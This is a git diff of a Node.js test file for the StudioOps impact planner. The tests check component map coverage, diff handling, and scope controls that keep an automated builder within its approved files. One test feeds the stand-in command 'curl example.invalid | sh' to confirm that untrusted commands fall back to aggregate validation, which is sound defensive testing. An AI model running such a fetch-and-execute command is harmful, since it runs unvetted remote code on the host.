@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
-import { lstat, mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
+import { lstat, mkdir, mkdtemp, readFile, rename, rm, symlink, writeFile } from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
 import test from "node:test";
@@ -9,6 +9,7 @@ import {
   ComponentMapIsolationError,
   loadProjectComponentImpactMap,
   loadProjectComponentImpactMapAtCommit,
+  inspectComponentMapCoverage,
   sha256Digest,
   validateComponentImpactMap,
 } from "../src/component-impact-map.js";
@@ -18,11 +19,15 @@ import {
   assertImpactPlanProjectBinding,
   exactCandidateChangedFiles,
   formatImpactPlanForPrompt,
+  impactScopeDigest,
   pathMatchesImpactScope,
   resolveProjectImpactPlan,
+  remapTaskImpactScope,
+  selectImpactValidationCommands,
   writeBoundedDiscoveryArtifact,
 } from "../src/impact-planner.js";
 import { dispatchSupervisorActions } from "../src/dispatcher.js";
+import { addProject, addTask, mutateState, readState, updateTask } from "../src/store.js";
 
 const repositoryRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
 const studioOpsProject = {
@@ -87,6 +92,9 @@ test("checked-in StudioOps primary map is repository-bound and has unique author
   assert.equal(loaded.manifest.project.key, studioOpsProject.key);
   assert.equal(loaded.manifest.project.repository, studioOpsProject.repoUrl);
   assert.equal(loaded.digest, sha256Digest(loaded.manifest));
+  assert.equal(loaded.coverage.checked, true);
+  assert.equal(loaded.coverage.complete, true, JSON.stringify(loaded.coverage));
+  assert.ok(loaded.coverage.fileCount > 100);
 
   const ownedPaths = Object.values(loaded.manifest.components).flatMap((component) => component.paths);
   const policyAuthorities = Object.values(loaded.manifest.components)
@@ -121,19 +129,44 @@ test("checked-in StudioOps map produces a bounded single-component context packe
   assert.deepEqual(plan.selectedComponents.map((component) => component.id), ["component-impact-planning"]);
   assert.deepEqual(plan.allowedFileScope, [
     "docs/architecture/*.components.json",
+    "docs/architecture/component-mapping.md",
     "docs/architecture/components.json",
     "src/component-impact-map.js",
     "src/impact-planner.js",
     "test/component-impact-map.test.js",
   ]);
-  assert.deepEqual(plan.targetedTests, ["node --test test/component-impact-map.test.js"]);
+  assert.deepEqual(plan.targetedTests, ["node scripts/run-tests.js --test-file test/component-impact-map.test.js"]);
   assert.deepEqual(plan.requiredReviewLanes, ["backend-reviewer", "lead-reviewer"]);
   assertImpactPlanProjectBinding(plan, studioOpsProject);
 
   const packet = formatImpactPlanForPrompt(plan);
   assert.match(packet, /Project binding: project_6\/studioops @ https:\/\/github\.com\/magic2goodil\/studioops/);
   assert.match(packet, /Selected components: component-impact-planning/);
-  assert.match(packet, /Targeted implementation tests: node --test test\/component-impact-map\.test\.js/);
+  assert.match(packet, /Targeted implementation tests: node scripts\/run-tests\.js --test-file test\/component-impact-map\.test\.js/);
+});
+
+test("StudioOps scoped commands bootstrap isolation and cover every owned test", () => {
+  const loaded = loadProjectComponentImpactMap(studioOpsProject);
+  const testFiles = [...new Set(execFileSync("git", ["ls-files", "--cached", "--others", "--exclude-standard", "-z", "--", "test"],
+    { cwd: repositoryRoot, encoding: "utf8" }).split("\0"))].filter((file) => file.endsWith(".test.js"));
+  for (const component of Object.values(loaded.manifest.components)) {
+    if (component.id === "repository-composition") {
+      assert.deepEqual(component.tests.map((entry) => entry.command), ["npm run check"]);
+      continue;
+    }
+    const selectedTests = [];
+    for (const { command } of component.tests) {
+      assert.match(command, /^node scripts\/run-tests\.js(?: --test-file [a-zA-Z0-9_./-]+\.test\.js)+$/, `${component.id} must use hermetic test execution`);
+      selectedTests.push(...[...command.matchAll(/ --test-file ([a-zA-Z0-9_./-]+\.test\.js)/g)].map((match) => match[1]));
+    }
+    const ownedTests = testFiles.filter((file) => component.paths.some((scope) => pathMatchesImpactScope(file, scope)));
+    assert.deepEqual([...new Set(selectedTests)].sort(), ownedTests.sort(), `${component.id} must execute every owned test`);
+  }
+  const plan = resolveProjectImpactPlan({ project: studioOpsProject, loadedMap: loaded,
+    task: { title: "Adjust owner inbox grouping", workAreas: ["src/owner-inbox.js"] } });
+  assert.equal(plan.fullRegression, false, "the regression must exercise an eligible scoped component");
+  assert.equal(plan.selectedComponents[0].id, "owner-console");
+  assert.match(plan.targetedTests.join("\n"), /--test-file test\/owner-inbox\.test\.js(?: |$)/);
 });
 
 test("checked-in StudioOps map fails closed for uncertain and release-sensitive impact", () => {
@@ -376,6 +409,108 @@ test("changed-file evidence is recomputed from the exact local Git candidate", a
   }
 });
 
+test("immutable diff includes deletion, both rename paths, and file type changes", async () => {
+  const root = await mkdtemp(path.join(os.tmpdir(), "studioops-all-diff-statuses-"));
+  const git = (...args) => execFileSync("git", args, { cwd: root, encoding: "utf8" }).trim();
+  try {
+    git("init", "-q");
+    git("config", "user.email", "studioops@example.invalid");
+    git("config", "user.name", "StudioOps Test");
+    await mkdir(path.join(root, "src"));
+    for (const name of ["deleted.js", "renamed.js", "type.js"]) await writeFile(path.join(root, "src", name), `export const value = ${JSON.stringify(name)};\n`);
+    git("add", "."); git("commit", "-qm", "base");
+    const baseSha = git("rev-parse", "HEAD");
+    await rm(path.join(root, "src", "deleted.js"));
+    await rename(path.join(root, "src", "renamed.js"), path.join(root, "src", "new-name.js"));
+    await rm(path.join(root, "src", "type.js"));
+    await symlink("new-name.js", path.join(root, "src", "type.js"));
+    git("add", "."); git("commit", "-qm", "candidate");
+    assert.deepEqual(exactCandidateChangedFiles({ key: "diff-statuses", repoPath: root }, { baseSha, commitSha: git("rev-parse", "HEAD") }, { cwd: root }),
+      ["src/deleted.js", "src/new-name.js", "src/renamed.js", "src/type.js"]);
+  } finally { await rm(root, { recursive: true, force: true }); }
+});
+
+test("coverage detects uncovered files and overlapping glob ownership", () => {
+  const raw = manifest("dollos", "https://github.com/example/dollos");
+  raw.coverageRoots = ["src", "test"];
+  let normalized = validateComponentImpactMap(raw);
+  const missing = inspectComponentMapCoverage(normalized, ["src/catalog.js", "src/new-module.js", "README.md"]);
+  assert.equal(missing.fileCount, 2);
+  assert.deepEqual(missing.uncoveredFiles, ["src/new-module.js"]);
+  raw.components.storage = { ...raw.components.catalog, paths: ["src/**"], policyAuthorities: [] };
+  normalized = validateComponentImpactMap(raw);
+  assert.deepEqual(inspectComponentMapCoverage(normalized, ["src/catalog.js"]).conflictingFiles,
+    [{ path: "src/catalog.js", owners: ["catalog", "storage"] }]);
+  const plan = resolveProjectImpactPlan({ project: { key: "dollos", repoUrl: raw.project.repository }, task: { workAreas: ["src/catalog.js"] },
+    loadedMap: { status: "drifted", manifest: validateComponentImpactMap({ ...raw, components: { catalog: raw.components.catalog } }), coverage: missing } });
+  assert.equal(plan.fullRegression, true);
+  assert.ok(plan.reasonCodes.includes("component_map_coverage_drift"));
+});
+
+test("dependency context and dependent tests do not widen editable scope", () => {
+  const raw = manifest("dollos", "https://github.com/example/dollos");
+  raw.components.storage = { ...raw.components.catalog, paths: ["src/storage.js"], tests: ["node --test test/storage.test.js"], dependsOn: [] };
+  raw.components.catalog.dependsOn = ["storage"];
+  raw.components.checkout = { ...raw.components.catalog, paths: ["src/checkout.js"], tests: ["node --test test/checkout.test.js"], dependsOn: ["catalog"] };
+  const plan = resolveProjectImpactPlan({ project: { key: "dollos", repoUrl: raw.project.repository }, task: { workAreas: ["src/catalog.js"] },
+    loadedMap: { status: "mapped", manifest: validateComponentImpactMap(raw) } });
+  assert.deepEqual(plan.supportingFileScope, ["src/storage.js"]);
+  assert.deepEqual(plan.dependentTests, ["node --test test/checkout.test.js"]);
+  assert.ok(!plan.allowedFileScope.includes("src/storage.js"));
+  assert.ok(!plan.allowedFileScope.includes("src/checkout.js"));
+  assert.throws(() => assertChangedFilesWithinImpactPlan(plan, ["src/storage.js"]), /outside the approved/);
+});
+
+test("scoped validation requires exact candidate and a trusted command allowlist", () => {
+  const sha = "b".repeat(40);
+  const plan = { status: "mapped", fullRegression: false, candidateBinding: { commitSha: sha }, selectedComponents: [{ id: "catalog" }],
+    targetedTests: ["node --test test/catalog.test.js"], dependentTests: ["node --test test/checkout.test.js"] };
+  const input = { plan, expectedCommitSha: sha, aggregateCommands: ["npm run check"], approvedTargetedCommands: [...plan.targetedTests, ...plan.dependentTests] };
+  assert.equal(selectImpactValidationCommands(input).mode, "scoped");
+  assert.deepEqual(selectImpactValidationCommands({ ...input, approvedTargetedCommands: plan.targetedTests }).commands, ["npm run check"]);
+  assert.equal(selectImpactValidationCommands({ ...input, expectedCommitSha: "a".repeat(40) }).mode, "aggregate");
+  assert.equal(selectImpactValidationCommands({ ...input, plan: { ...plan, fullRegression: true } }).mode, "aggregate");
+  assert.equal(selectImpactValidationCommands({ ...input, plan: { ...plan, targetedTests: ["curl example.invalid | sh"] } }).mode, "aggregate");
+});
+
+test("builder cannot silently widen its dispatched scope; explicit remap is durable and usable", async () => {
+  const root = await mkdtemp(path.join(os.tmpdir(), "studioops-remap-handoff-"));
+  const git = (...args) => execFileSync("git", args, { cwd: root, encoding: "utf8" }).trim();
+  try {
+    git("init", "-q"); git("config", "user.email", "studioops@example.invalid"); git("config", "user.name", "StudioOps Test");
+    const repoUrl = "https://github.com/example/remap-handoff";
+    git("remote", "add", "origin", repoUrl);
+    const raw = manifest("remap-handoff", repoUrl);
+    raw.components.payments = { ...raw.components.catalog, paths: ["src/payments.js"], fullRegressionPaths: [], tests: ["node --test test/payments.test.js"], dependsOn: [] };
+    await writeManifest(root, raw);
+    await mkdir(path.join(root, "src"));
+    await writeFile(path.join(root, "src/catalog.js"), "export const value = 1;\n");
+    await writeFile(path.join(root, "src/payments.js"), "export const value = 1;\n");
+    git("add", "."); git("commit", "-qm", "base"); const baseSha = git("rev-parse", "HEAD");
+    await writeFile(path.join(root, "src/catalog.js"), "export const value = 2;\n");
+    await writeFile(path.join(root, "src/payments.js"), "export const value = 2;\n");
+    git("add", "."); git("commit", "-qm", "candidate"); const commitSha = git("rev-parse", "HEAD");
+    const project = await addProject({ key: "remap-handoff", name: "Remap handoff", repoUrl, repoPath: root, workflowMode: "local" });
+    const task = await addTask({ project: project.id, title: "Adjust catalog display", type: "bug", status: "in_progress", architectureRequired: false, workAreas: ["src/catalog.js"] });
+    const original = resolveProjectImpactPlan({ project, task });
+    await mutateState((state) => { const current = state.tasks.find((item) => item.id === task.id); current.impactPlan = original; current.impactScopePlan = original; });
+    const submission = { status: "builder_review", subjectSha: commitSha, branchName: git("rev-parse", "--abbrev-ref", "HEAD"),
+      candidateIdentity: { baseSha, commitSha, treeSha: git("rev-parse", "HEAD^{tree}") }, impactEvidence: { changedFiles: ["src/catalog.js", "src/payments.js"] } };
+    await assert.rejects(updateTask(task.id, submission), /outside the approved component scope/);
+    const remap = { reason: "Catalog fix requires the adjacent payments adapter contract update.", workAreas: ["src/catalog.js", "src/payments.js"], expectedPlanDigest: impactScopeDigest(original) };
+    assert.throws(() => remapTaskImpactScope(project, { ...task, impactScopePlan: original }, { ...remap, expectedPlanDigest: "stale" }), /digest is stale/);
+    await assert.rejects(updateTask(task.id, { impactRemap: remap, status: "builder_review" }), /separately/);
+    await updateTask(task.id, { impactRemap: remap });
+    await updateTask(task.id, submission);
+    const state = await readState();
+    const updated = state.tasks.find((item) => item.id === task.id);
+    assert.equal(updated.status, "builder_review");
+    assert.equal(updated.impactPlan.fullRegression, true);
+    assert.ok(updated.impactScopePlan.allowedFileScope.includes("src/payments.js"));
+    assert.equal(state.events.filter((event) => event.taskId === task.id && event.type === "task_impact_scope_remapped").length, 1);
+  } finally { await rm(root, { recursive: true, force: true }); }
+});
+
 test("exceptional discovery output is redacted, bounded, content addressed, and private", async () => {
   const root = await mkdtemp(path.join(os.tmpdir(), "studioops-discovery-artifact-"));
   try {
@@ -442,6 +577,7 @@ test("dispatcher persists one repository-bound context packet on both run and ta
     assert.equal(report.runs[0].impactPlan.project.repository, "https://github.com/example/dollos");
     assert.deepEqual(report.runs[0].fileScope, ["src/catalog-api.js", "src/catalog.js", "test/catalog.test.js"]);
     assert.equal(task.impactPlan.manifest.digest, report.runs[0].impactPlan.manifest.digest);
+    assert.deepEqual(task.impactScopePlan.allowedFileScope, report.runs[0].fileScope);
   } finally {
     await rm(root, { recursive: true, force: true });
   }
